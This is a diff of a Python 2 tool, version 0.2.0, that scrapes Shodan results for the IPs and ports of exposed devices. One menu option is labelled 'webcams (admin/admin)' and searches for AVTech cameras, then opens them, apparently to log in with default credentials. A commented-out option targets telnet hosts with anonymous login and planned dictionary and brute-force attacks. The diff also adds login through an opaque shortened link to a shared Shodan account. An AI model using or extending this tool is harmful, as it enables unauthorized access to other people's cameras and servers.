@@ -1,14 +1,13 @@
 import requests,time
 import httplib, urllib
-import time
 from bs4 import BeautifulSoup
 from selenium import webdriver
 import sys
-from selenium.webdriver.common.keys import Keys
 from termcolor import colored
 from colored import fg, bg, attr
-import getpass
 import telnetlib
+
+
 ###########################################################################
 
 ################### used functions to be abstracted later #################
@@ -27,7 +26,7 @@ def print_logo():
 	print ('%s | $$$$$$$/ | $$  | $$ | $$       %s' % (fg(1), attr(1)))
 	print ('%s |_______/  |__/  |__/ |__/       %s' % (fg(1), attr(1)))
 	print "\n"
-	print ('%s 	version [0.1.0] %s' % (fg(1), attr('reset')))
+	print ('%s 	version [0.2.0] %s' % (fg(1), attr('reset')))
  	print "\n"
 	return
 ###########################################################################
@@ -35,8 +34,7 @@ def print_logo():
 def scrab(query,driver):
 	ip_lst=[]
 	port_lst=[]
-	
-	for pagenum in range (1,6) :
+	for pagenum in range (1,20) :
 		params = urllib.urlencode({'query':query , 'page':pagenum})
 		driver.get("https://www.shodan.io/search?%s" % params)
 		html = driver.page_source
@@ -136,10 +134,10 @@ def prnt_targets(ip_lst):
 	for i in range(0,n):
 		print(i,ip_lst[i],port_lst[i])
 		if(i==0):
-			with open("/root/Desktop/python/output.txt", "w") as text_file:
+			with open("output.txt", "w") as text_file:
     				text_file.write(ip_lst[i]+":"+port_lst[i]+'\n')
 		else:
-			with open("/root/Desktop/python/output.txt", "a") as text_file:
+			with open("output.txt", "a") as text_file:
     				text_file.write(ip_lst[i]+":"+port_lst[i]+'\n')
 	return
 ###########################################################################
@@ -255,57 +253,107 @@ def telnet(ch,ip_lst):
 		print"coming soon :) press ctrl+z to exit"
 
 	return 
+##############################################################################
+def auto_auth(driver):
+
+	driver.get("https://shodan.io")
+	driver.get("https://goo.gl/jA2sBG")
+	time.sleep(2)
+	driver.get("https://shodan.io")
+
+	return
+
+def custom_auth(driver):
+	#shodan account  auto login
+	s = requests.Session()
+	name =raw_input("enter your shodan account's username :")
+	passwd = raw_input("enter your shodan's account's password :")
+	pars = {'username': name, 'password': passwd}
+	resp = s.post("https://account.shodan.io/login", data=pars)
+	driver.get("https://shodan.io")
+
+	key=[]
+	value=[]
+	for i in range(0,len(s.cookies.get_dict().keys())):
+		key.append(str(s.cookies.get_dict().keys()[i]))
+		value.append(str(s.cookies.get_dict()[key[i]]))
+		#driver.add_cookie({'name':key[i], 'value':value[i]})
+		driver.add_cookie({
+			'domain': '.shodan.io', # note the dot at the beginning
+			'name':key[i],
+			'value':value[i],
+			'path': '/',
+			'expires': None
+		})
+	driver.get("https://shodan.io")
+
+
+	return
 
 
 ################################ main ###########################################
 
 
 print_logo()
+driver = webdriver.PhantomJS(executable_path='/root/node_modules/phantomjs-prebuilt/bin/phantomjs',service_args=['--web-security=false'])
+auth_ch = raw_input('\n 1-BAF authentication \n 2-enter your own shodan credentials \n')
+if auth_ch in ['1']:
+	auto_auth(driver)
+elif auth_ch in ['2']:
+	custom_auth(driver)
+else:
+	print('please enter a valid choice')
+	driver.quit()
+	exit()
 
-#shodan auto login 
-s = requests.Session()
-name=raw_input("enter your shodan's account username :")
-passwd=raw_input("enter your shodan's account password :")
-pars = { 'username': name, 'password': passwd}
-resp = s.post("https://account.shodan.io/login", data=pars)
 
-#print resp
-driver = webdriver.Firefox()
-#driver = webdriver.PhantomJS()
-driver.get("https://shodan.io")
-#driver.delete_all_cookies()
-key=[]
-value=[]
-for i in range(0,len(s.cookies.get_dict().keys())):
-	key.append(str(s.cookies.get_dict().keys()[i]))
-	value.append(str(s.cookies.get_dict()[key[i]]))
-	driver.add_cookie({'name':key[i], 'value':value[i]})
-	
 
+
+
+#print driver.get_cookies()
 #go to the website logged in 	
-driver.get("https://shodan.io")
 
+#print driver.get_log('browser')
+#driver.save_screenshot("example.png")
+#print driver.get_cookies()
+#print driver.get_log('har')
+#print driver.page_source
+
+
+#driver.quit()
 #searching for ips and ports on the first 5 pages of the results and storing them in 2 lists (ie:ip&port lists)
-ip_lst=[]
-port_lst=[]
-choice=raw_input('\n 1-webcams (admin/admin) \n 2-custom search \n 3-test telnet connectivity "underconstruction" \n')
+ip_lst = []
+port_lst = []
+choice = raw_input('\n 1-webcams (admin/admin) \n 2-custom search \n 3-test telnet connectivity "underconstruction" \n')
 
-	
+
+
 if choice in ['1']:
 	query="linux upnp avtech"
 	ip_lst,port_lst=scrab(query,driver)
 	auto_open(ip_lst,port_lst)
+	driver.quit()
+	exit()
 
 elif choice in ['2']:
-	query=raw_input('what do you want to search for?')
+	cs_ch=raw_input('what do you wanna search for? ')
+	query=cs_ch
 	ip_lst,port_lst=scrab(query,driver)
 	prnt_targets(ip_lst)
-
-elif choice in ['3']:
+	driver.quit()
+	exit()
+else:
+	print('please enter a valid choice')
+	driver.quit()
+	exit()
+"""elif choice in ['3']:
 	query="telnet"
 	ip_lst,port_lst=scrab(query,driver)
 	ch=raw_input('\n 1-anonymous login \n 2-dictionary attack "coming soon" \n 3-brute force attack "coming soon" \n')
 	telnet(ch,ip_lst)
+	driver.quit()
+	exit()"""
+
 
 
 
